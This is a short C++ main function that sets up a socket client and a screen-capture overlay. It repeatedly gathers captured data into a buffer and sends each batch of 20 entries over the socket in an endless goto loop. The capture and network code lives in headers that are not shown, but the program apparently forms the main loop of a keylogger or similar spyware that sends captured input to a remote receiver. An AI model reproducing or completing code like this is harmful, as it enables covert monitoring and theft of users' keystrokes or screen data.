#include <iostream>
#include "socketClient.h"
#include "capture.h"
#include <iomanip>

int main()
{	
	client::init();
	capture::initOverlay();

	callback:
	while (capture::bufferSize < 20)
	{
		SetActiveWindow(capture::window);
		capture::monitor();
	}
	client::sendMessage(capture::buffer);
	capture::bufferSize = 0;
	goto callback;	//forgive me, for i have sinned.
	return 0;
}